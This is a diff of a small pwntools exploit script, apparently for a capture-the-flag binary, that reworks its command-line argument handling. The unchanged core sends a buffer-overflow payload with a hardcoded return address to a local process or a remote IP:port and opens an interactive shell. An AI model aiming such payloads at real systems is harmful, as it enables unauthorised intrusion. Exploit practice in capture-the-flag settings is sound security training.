@@ -2,56 +2,34 @@
 # -*- coding: UTF-8 -*-
 
 from pwn import *
-import sys, getopt
+from sys import exit
+import argparse
 
-context(arch = 'amd64', os = 'linux', log_level = 'error')
-libc = ''
-remote_addr = ''
-binary = ''
+parser = argparse.ArgumentParser()
+group = parser.add_mutually_exclusive_group()
+group.add_argument("-o", help="path to an executable file.", metavar = "<path to file>")
+group.add_argument("-r", help="address of an remote machine.", metavar = "<ip:port>")
+parser.add_argument("-v", help="debug log level, default level is error.", action="store_true")
+parser.add_argument("--libc", help="specify the libc to preload", metavar = "<path to file>")
+args = parser.parse_args()
 
-def usage():
-    print('''Usage: ./p.py -o -d -r --libc
-    Requred args:
-    -o Path to a local executable.
-    -r Connect to IP:PORT if arg -o not given.
-    Optimal args:
-    -d Debug.
-    --libc Path to a specific libc''')
-
-def getarg(argv):
-    global context
-    global libc
-    global remote_addr
-    global binary
-    try:
-        opts, args = getopt.getopt(argv, 'hdr:o:', ['help', 'libc='])
-        for opt, arg in opts:
-            if opt in ('-h', '--help'):
-                usage()
-                sys.exit(2)
-            elif opt in '-d':
-                context.log_level = 'debug'
-
-            elif opt in '-o':
-                binary = arg
-            elif opt in '-r':
-                remote_addr = arg
-            elif opt in ('--libc'):
-                libc = arg
-    except getopt.GetoptError:
-        usage()
-        sys.exit(2)
-    if not binary and not remote:
-        usage()
-        sys.exit(2)
 
 if __name__ == "__main__":
-    getarg(sys.argv[1:])
-    if not binary:
+    binary = args.o
+    remote_addr = args.r
+    debug = args.v
+    libc = args.libc
+    if not binary and not remote_addr:
+        parser.print_usage()
+        exit()
+    elif not remote_addr:
+        if not libc:
+            p = process(binary)
+        else:
+            p = process(binary, env={'LD_PRELOAD': libc})
+    else:
         remote_addr = remote_addr.split(':')
         p = remote(remote_addr[0], remote_addr[1])
-    else :
-        p = process(binary,  env={'LD_PRELOAD':libc})
 
     p.sendline(b'A' * 16 + p64(0x40119F));
     p.interactive()
